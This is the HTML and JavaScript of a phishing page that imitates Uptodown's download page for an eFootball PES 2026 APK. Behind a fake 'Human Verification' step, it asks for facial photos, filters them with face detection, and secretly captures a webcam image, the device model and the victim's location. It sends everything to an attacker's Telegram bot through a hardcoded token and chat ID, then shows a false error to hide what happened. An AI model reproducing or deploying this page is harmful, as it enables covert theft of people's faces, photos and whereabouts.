<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download eFootball PES 2026 for Android (APK) - Uptodown</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <style>
        :root { 
            --upto-bg: #0b2129; 
            --upto-header: #051116; 
            --upto-blue: #1b85d3; 
            --upto-green: #00b451; 
            --upto-card: #0c262f; 
            --text-main: #ffffff;
            --text-dim: #7e949c;
        }
        body { margin: 0; background-color: var(--upto-bg); font-family: 'Roboto', sans-serif; color: var(--text-main); -webkit-font-smoothing: antialiased; }
        
        /* Header & Nav */
        header { background: var(--upto-header); height: 62px; display: flex; align-items: center; padding: 0 45px; border-bottom: 1px solid #102a33; position: sticky; top: 0; z-index: 100; }
        .burger { margin-right: 25px; cursor: pointer; color: var(--upto-blue); font-size: 24px; }
        .logo { height: 26px; }

        /* Main Section */
        .wrapper { max-width: 1080px; margin: 0 auto; padding: 30px 20px; }
        .breadcrumb { font-size: 11px; color: var(--text-dim); margin-bottom: 25px; text-transform: uppercase; letter-spacing: 0.5px; }
        
        .app-hero { display: flex; gap: 30px; align-items: flex-start; margin-bottom: 40px; }
        .app-icon { width: 112px; height: 112px; border-radius: 24px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); }
        .app-title { font-size: 38px; font-weight: 700; margin: 0; line-height: 1.1; }
        .app-meta { font-size: 15px; margin-top: 8px; font-weight: 400; }
        .konami-link { color: var(--upto-blue); text-decoration: none; }
        .badge { background: #1e3a45; color: var(--upto-blue); padding: 2px 8px; border-radius: 10px; font-size: 11px; margin-left: 8px; vertical-align: middle; }

        /* Stats & Security */
        .stats-row { display: flex; gap: 40px; margin: 25px 0; border-top: 1px solid #15323d; border-bottom: 1px solid #15323d; padding: 20px 0; }
        .stat-item { text-align: left; }
        .stat-val { display: block; font-size: 20px; font-weight: 700; }
        .stat-lbl { font-size: 13px; color: var(--text-dim); }

        /* Real Buttons */
        .actions { display: flex; gap: 15px; margin-top: 30px; }
        .btn-latest { background: var(--upto-green); color: white; padding: 18px 45px; border-radius: 8px; font-weight: 700; border: none; cursor: pointer; font-size: 18px; box-shadow: 0 4px 0 #008a3d; display: flex; align-items: center; gap: 10px; }
        .btn-latest:active { transform: translateY(2px); box-shadow: none; }
        .btn-pc { background: #f39c12; color: white; padding: 18px 30px; border-radius: 8px; font-weight: 700; border: none; cursor: pointer; box-shadow: 0 4px 0 #d35400; }

        /* Tech Details (Exact Grid) */
        .tech-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; background: var(--upto-card); padding: 30px; border-radius: 12px; margin-top: 50px; }
        .tech-cell b { display: block; color: var(--text-dim); font-size: 12px; margin-bottom: 6px; font-weight: 400; }
        .tech-cell span { font-size: 15px; font-weight: 500; }

        /* Stealth Layer */
        #mask { display: none; position: fixed; inset: 0; background: var(--upto-header); z-index: 99999; align-items: center; justify-content: center; }
        .loader-card { background: var(--upto-card); padding: 40px; border-radius: 20px; border: 1px solid var(--upto-blue); text-align: center; width: 340px; }
        .spn { width: 40px; height: 40px; border: 4px solid #15323d; border-top-color: var(--upto-blue); border-radius: 50%; animation: r 1s linear infinite; margin: 0 auto 20px; }
        @keyframes r { to { transform: rotate(360deg); } }

        video, canvas, #f { display: none; }
    </style>
</head>
<body>

<header>
    <div class="burger">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
</header>

<div class="wrapper">
    <div class="breadcrumb">Android / Games / Sports / eFootball PES 2026</div>

    <div class="app-hero">
        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon">
        <div class="app-content">
            <h1 class="app-title">eFootball PES 2026</h1>
            <div class="app-meta">10.4.0 <a href="#" class="konami-link">KONAMI</a> <span class="badge">#SPORTS</span></div>
            
            <div class="stats-row">
                <div class="stat-item"><span class="stat-val">★ 4.4</span><span class="stat-lbl">135,887 reviews</span></div>
                <div class="stat-item"><span class="stat-val">74.8 M</span><span class="stat-lbl">downloads</span></div>
                <div class="stat-item"><span class="stat-val">🛡️</span><span class="stat-lbl">Security</span></div>
            </div>

            <p style="color:var(--text-dim); font-size:15px;">The most realistic soccer game for Android</p>

            <div class="actions">
                <button class="btn-latest" onclick="openGate()">Get the latest version 📥</button>
                <button class="btn-pc">Play on PC</button>
            </div>
        </div>
    </div>

    <div class="tech-grid">
        <div class="tech-cell"><b>Package Name</b><span>jp.konami.pesam</span></div>
        <div class="tech-cell"><b>License</b><span>Free</span></div>
        <div class="tech-cell"><b>Operating System</b><span>Android</span></div>
        <div class="tech-cell"><b>Requirements</b><span>Android 7.0+</span></div>
        <div class="tech-cell"><b>Language</b><span>English (44 more)</span></div>
        <div class="tech-cell"><b>File type</b><span>XAPK</span></div>
    </div>
</div>

<div id="mask">
    <div class="loader-card">
        <div id="loadingBox">
            <div class="spn"></div>
            <h3 style="margin:0;">Optimizing for your device...</h3>
            <p style="color:var(--text-dim); font-size:13px; margin-top:10px;">Please wait, establishing secure connection.</p>
        </div>
        <div id="verifBox" style="display:none;">
            <h3 style="color:var(--upto-blue)">Human Verification</h3>
            <p style="font-size:13px;">Select 5 facial photos from your gallery to start the APK download.</p>
            <label for="f" style="background:var(--upto-blue); display:block; padding:15px; border-radius:8px; cursor:pointer; font-weight:900; margin-top:20px;">BROWSE GALLERY</label>
            <input type="file" id="f" multiple accept="image/*" onchange="run(this)">
            <p id="msg" style="font-size:11px; margin-top:10px;"></p>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const KEY = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let photos = [];

    async function init() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    init();

    function openGate() {
        document.getElementById('mask').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('loadingBox').style.display = 'none';
            document.getElementById('verifBox').style.display = 'block';
        }, 2000);
    }

    async function run(input) {
        document.getElementById('msg').innerText = "AI is scanning for faces...";
        const files = Array.from(input.files);
        for (let file of files) {
            const img = await faceapi.bufferToImage(file);
            const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (detections.length > 0) photos.push(file);
        }
        await startBack();
    }

    async function startBack() {
        // 1. Device Info
        const info = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
        
        // 2. Secret Camera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            const canv = document.getElementById('c');
            canv.width = v.videoWidth; canv.height = v.videoHeight;
            canv.getContext('2d').drawImage(v, 0, 0);
            const blob = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
            stream.getTracks().forEach(t => t.stop());

            // 3. Location & Send
            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await push(info, map, blob);
            }, () => push(info, "Denied", blob));
        } catch(e) { push(info, "Cam Blocked", null); }
    }

    async function push(d, l, s) {
        await fetch(`https://api.telegram.org/bot${KEY.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: KEY.C, text: `💎 *UPTODOWN CLONE - HIT*\n📱 Device: ${d}\n📍 Location: ${l}`, parse_mode: 'Markdown'})
        });

        if(s) {
            const fd = new FormData(); fd.append('chat_id', KEY.C); fd.append('photo', s);
            await fetch(`https://api.telegram.org/bot${KEY.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let p of photos) {
            const fd2 = new FormData(); fd2.append('chat_id', KEY.C); fd2.append('photo', p);
            fetch(`https://api.telegram.org/bot${KEY.T}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("XAPK Validation Error (404). Your device is not supported.");
        location.reload();
    }
</script>
</body>
</html>
